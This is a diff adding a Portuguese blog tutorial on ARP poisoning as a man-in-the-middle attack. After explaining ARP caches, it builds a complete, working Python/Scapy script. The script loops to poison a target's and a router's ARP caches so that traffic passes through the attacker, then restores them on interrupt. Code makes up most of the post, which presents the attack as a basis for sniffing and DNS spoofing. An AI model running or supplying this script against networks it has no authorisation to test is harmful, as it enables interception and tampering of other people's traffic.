@@ -1,8 +1,147 @@
 ---
-title: 'ARP Poisoning - Ataque MITM'
-date: '2024-07-30'
-summary: 'O que é e como funciona o ARP poisoning, um dos mais famosos ataques man-in-the-middle, e como explorá-lo usando scapy em python.'
+title: 'ARP Poisoning: O que é e como realizar este ataque MITM'
+date: '2024-08-03'
+summary: 'O que é e como funciona o ARP poisoning, um dos mais famosos ataques man-in-the-middle, e como explorá-lo usando Scapy em python.'
 tags: ['hacking', 'mitm']
-draft: true
+draft: false
 ---
 
+![ARP Spoofing](/static/images/arp-spoof/arp-spoofing.jpg)
+O que é e como funciona o ARP poisoning, um dos mais famosos ataques man-in-the-middle, e como explorá-lo usando Scapy em python.
+
+---
+
+<TOCInline toc={props.toc} asDisclosure />
+
+## O que é o ARP
+
+Na rede interna, os computadores se comunicam através do MAC address, e o ARP é o protocolo responsável pela identificação do MAC de cada máquina através de seu endereço IP.
+
+Quando uma máquina vai se comunicar com a outra, ela manda um pacote ARP Broadcast ao MAC ff:ff:ff:ff:ff:ff com o destino sendo o IP da máquina alvo, este pacote passa por todos da rede e quem possuir o IP informado, responderá com o seu endereço MAC.
+
+Para economizar recursos, cada máquina salva um cache com os MACs dos usuários da rede.
+
+O ARP Poisoning attack atua nesse cache, “envenenando-o” e se passando pelo roteador, o que permite realizar diversos outros ataques, pois ao se passar pelo roteador todo o tráfego da rede passará por ele, permitindo sniffers, DNS Spoofing, etc.
+
+## Como funciona o ataque
+
+![ARP Poisoning](/static/images/arp-spoof/arp-poisoning.png)
+
+### Envenenando o ARP
+
+Primeiro o atacante envia uma requisição falsa ao roteador se passando pelo alvo.
+Em seguida, envia um pacote ao alvo se passando pelo roteador, porém, usando o seu próprio endereço MAC.
+Com isso o alvo identifica o IP do roteador como sendo dono do MAC address do atacante, e em um ataque, enviando infinitamente esta sequência de pacotes, nós conseguimos envenenar o ARP cache do alvo e nos passar pelo roteador!
+
+### Restaurando o ARP
+
+Para restaurar o ARP cache, o atacante envia novamente uma requisição ao roteador se passando pelo alvo, e em seguida envia um pacote ao alvo se passando pelo roteador, porém, com o MAC address real do roteador, assim restaurando o ARP cache.
+
+## Criando o script
+
+Agora que já entendemos como funciona o ataque vamos criar um script em Python que faça isso por nós!
+
+Vamos começar importando o Scapy, biblioteca que iremos usar para criar os nossos pacotes.
+```python:arppoison.py
+from scapy.all import *
+```
+
+Agora vamos criar a função responsável por conseguir o mac address do roteador e do alvo:
+```python:arppoison.py
+def get_mac_address(ip):
+    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip) # Cria o pacote falso de ARP Request
+    ans, uns = srp(arp_broadcast, timeout=2, verbose=0) # Envia o pacote e espera uma resposta
+
+    return ans[0][1][1].hwsrc
+```
+
+E agora a função que enviará os pacotes para o envenenamento do ARP:
+```python:arppoison.py
+def poison_arp(dest_ip, dest_mac, src_ip):
+    arp_spoof = ARP(op=2, psrc=src_ip, pdst=dest_ip, hwdst=dest_mac) # Cria o pacote falso
+    send(arp_spoof, verbose=0) # Envia o pacote
+```
+
+Função que irá restaurar o ARP do alvo:
+```python:arppoison.py
+def restore_arp(dest_ip, dest_mac, src_ip, src_mac):
+    pkt = ARP(op=2, hwsrc=src_mac, hwdst=dest_mac, psrc=src_ip, pdst=dest_ip) # Cria o pacote para restaurar o arp
+    send(pkt, verbose=0) # Envia o pacote
+```
+
+Função que irá executar o ataque:
+```python:arppoison.py
+def main(gateway, target):
+    target_mac  = get_mac_address(target) # Captura o mac do alvo
+    gateway_mac = get_mac_address(gateway) # Captura o mac do roteador
+
+    print("Target MAC: "+target_mac)
+    print("Gateway MAC: "+gateway_mac)
+
+    try:
+        while True:
+            print("Envenenando o ARP")
+            poison_arp(gateway, gateway_mac, target) # Envia a requisição ao roteador
+            poison_arp(target, target_mac, gateway) # Envia a resposta falsa ao alvo
+    except KeyboardInterrupt:
+        print("Restaurando ARP")
+        restore_arp(target, target_mac, gateway, gateway_mac) # Restaura o ARP
+        restore_arp(gateway, gateway_mac, target, target_mac) # Restaura o ARP
+```
+
+E por fim, as instruções para iniciar o ataque:
+```python:arppoison.py
+if __name__ == "__main__":
+    gateway = "192.168.1.1"
+    target  = "192.168.1.106"
+
+    print("Iniciando o ataque")
+    main(gateway,target) # Inicia o ataque
+```
+
+Nosso código está pronto! Com isso já podemos envenenar o ARP do nosso alvo e realizar diversos outros ataques, como o DNS Spoofing que irei demonstrar no próximo artigo.
+
+Código final:
+
+```python:arppoison.py showLineNumbers
+from scapy.all import *
+
+def get_mac_address(ip):
+    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip) # Cria o pacote falso de ARP Request
+    ans, uns = srp(arp_broadcast, timeout=2, verbose=0) # Envia o pacote e espera uma resposta
+
+    return ans[0][1][1].hwsrc
+
+def poison_arp(dest_ip, dest_mac, src_ip):
+    arp_spoof = ARP(op=2, psrc=src_ip, pdst=dest_ip, hwdst=dest_mac) # Cria o pacote falso
+    send(arp_spoof, verbose=0) # Envia o pacote
+
+def restore_arp(dest_ip, dest_mac, src_ip, src_mac):
+    pkt = ARP(op=2, hwsrc=src_mac, hwdst=dest_mac, psrc=src_ip, pdst=dest_ip) # Cria o pacote para restaurar o arp
+    send(pkt, verbose=0) # Envia o pacote
+
+def main(gateway, target):
+    target_mac  = get_mac_address(target) # Captura o mac do alvo
+    gateway_mac = get_mac_address(gateway) # Captura o mac do roteador
+
+    print("Target MAC: "+target_mac)
+    print("Gateway MAC: "+gateway_mac)
+
+    try:
+        while True:
+            print("Envenenando o ARP")
+            poison_arp(gateway, gateway_mac, target) # Envia a requisição ao roteador
+            poison_arp(target, target_mac, gateway) # Envia a resposta falsa ao alvo
+    except KeyboardInterrupt:
+        print("Restaurando ARP")
+        restore_arp(target, target_mac, gateway, gateway_mac) # Restaura o ARP
+        restore_arp(gateway, gateway_mac, target, target_mac) # Restaura o ARP
+
+if __name__ == "__main__":
+    gateway = "192.168.1.1"
+    target  = "192.168.1.106"
+
+    print("Iniciando o ataque")
+    main(gateway,target) # Inicia o ataque
+```
+[Código Final](https://gist.github.com/ReddyyZ/e8f3ccbe5441e3e3068e573e5578072c#file-arppoison-py)
